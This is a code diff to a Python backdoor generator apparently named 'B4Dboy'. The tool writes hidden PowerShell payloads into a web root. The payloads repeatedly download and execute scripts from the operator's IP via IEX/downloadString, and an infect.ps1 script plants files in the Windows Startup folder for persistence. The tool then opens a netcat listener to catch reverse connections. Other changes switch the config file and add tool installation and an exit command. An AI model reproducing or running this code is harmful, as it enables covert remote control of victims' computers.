@@ -27,10 +27,10 @@ def generate_bd():
         else: type = "simple"     
         if "-lip" in arg: ip = arg; ip = ip.split(ip[4])[1]
         else:
-                ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
-                for value in ip:
-                    if "/24" in value: break
-                ip = value[9:][:12].split(".")
+            ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
+            for value in ip:
+                if "/24" in value: break
+            ip = value[9:][:15].split(".")
 
     if osT == "windows" or osT == "win":
         
@@ -46,10 +46,10 @@ def generate_bd():
         tempPayload = 'function loop {\n    powershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1'"+')"\n    Start-Sleep -Seconds 30\n    loop\n}\nloop'
         os.system("echo "+'"IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')" '+"> /var/www/html/b4dboy/"+id+"/evoke.txt")  # Payload executed on Startup (Evoke.txt) Maker
         with open(f"/var/www/html/b4dboy/{id}/temp.ps1","w") as tpF: tpF.write(tempPayload); tpF.close()  # Loop request (temp.ps1) Maker
-        with open(f"/var/www/html/b4dboy/{id}/Bb.ps1", "w") as BbF: BbF.write("powershell -c (Get-Content -path ..\evoke.txt)"); BbF.close()  # Executer on startup (Bb.ps1) Maker
+        os.system(f'sudo cp payloads/win/converted.txt /var/www/html/b4dboy/{id}') # Bb.bat / ejecuter on start
         with open(f"/var/www/html/b4dboy/{id}/infect.ps1", "w") as ifc:
-            ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt > evoke.txt")
-            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/Bb.ps1 > Bb.ps1")
+            ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; wget http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/converted.txt -o Bb.bat")
+            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt > evoke.txt")
             ifc.write('\npowershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')"')
         ifc.close()
                 
@@ -58,7 +58,7 @@ def generate_bd():
 
         ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
         if timer == "start":
-            print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system('netcat -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
+            print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system(f'{config["nportg"]} -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
             if del_ver != "n" and del_ver != "N": os.system(f'rm -rf /var/www/html/b4dboy/{id}')
         elif timer == "store": print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+")"); input("[!] Press enter for start scanning (just )"); store_session(id, system, get_ip(ip), str(port), "", "")
         else: print("\nPayload for Powershell (listen just after execution) : "+payloadS+"\nPayload for Powershell (store session) : "+payloadT+"\n(for listen in case of store session : start -s="+id+")"); store_session(id, system, get_ip(ip), str(port), "", "")
@@ -157,10 +157,10 @@ def start_ses():
             for sess in sessData:
                 if ses == sess['sess_id']: port = sess['port']
         print("Waiting for connections on : "+port+"...  ¡This action may take 5 min!")
-        os.system('netcat -lp '+port)
+        os.system(f'{config["nportg"]} -lp '+port)
     elif lst != "":
         print("Waiting for connections on : "+lst)
-        os.system('netcat -lp '+lst)
+        os.system(f'{config["nportg"]} -lp '+lst)
     else:
         print("[-] Err : No Parameter given ")
 
@@ -199,29 +199,29 @@ def show_info():
 
 def mod_config(args):
     for arg in args:
-        with open("config.json", "r") as configF:
+        with open(".config.json", "r") as configF:
             conf = json.loads(configF.read())
         configF.close()
         if "-i" in arg:
             if "--interface" in arg: interface = arg.split(arg[11])[1]
             else: interface = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-p" in arg:
             if "--packages" in arg: packages = arg.split(arg[10])[1]
             else: packages = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-t" in arg:
             if "--token" in arg: token = arg.split(arg[7])[1]
             else: token = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-d" in arg:
             if "--dictionary" in arg: dictionary = arg.split(arg[13])[1]
             else: dictionary = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-p" in arg:
             if "--path" in arg: path = arg.split(arg[6])[1]
             else: path = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+path+'"\n}'); confF.close()
+            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+path+'"\n}'); confF.close()
     print("[+] Config updated succesfully")
 
 def help_panel():
@@ -236,7 +236,19 @@ def help_panel():
 # Functions
 
 def setup():
-    with open("config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
+    with open(".config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
+    # Config
+    if config["interface"] == "": print("Please configure interface :config -i=interface")
+    if config["server_mg"] == "": print("Please configure local server manager command. Ex :config -sm=service apache2")
+    if config["nportg"] == "": print("Please configure port manager. Ex :config -pm=ncat")
+    # Programs
+    apps = []
+    print("[!] Installing Thsark.."); apps.append('tshark')if str(subprocess.check_output("tshark -c 0&", shell=True)) == "127" else print("[+] Tshark is instaled")
+    print(f'[!] Installing {config["nportg"]}.') if str(subprocess.check_output(config["nportg"]+' localhost &', shell=True)) == "127" else print(f'[+] {config["nportg"]} is instaled')
+    for i in apps: os.system(f'sudo apt install {i}')
+    os.system('clear')
+    banner()
+    # Services
     out = str(subprocess.check_output("ps aux | grep apache2", shell=True))
     if "www-data" not in out: os.system('service apache2 start'); print("[*] Apache Server is Started.")
     else: print("[*] Apache server is start")
@@ -322,12 +334,19 @@ def remove_geo(id):
 banner()
 setup()
 while True:
-    with open("config.json", "r") as cFile:
+    with open(".config.json", "r") as cFile:
         config = json.loads(cFile.read())
     try:
         action = input("B4Dboy > ").split(' ')
         if action[0] != "":
-            if action[0] == "h" or action[0] == "help":
+            if action[0] == "close" or action[0] == "bye":
+                close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
+                if close_vrf != "n" and close_vrf != "N":
+                    print("Saliendo ...")
+                    os.system("service apache2 stop")
+                    os.system('clear')
+                    exit()
+            elif action[0] == "h" or action[0] == "help":
                 help_panel()
             elif action[0] == "gen" or action[0] == "generate":
                 if len(action) > 1: generate_bd()
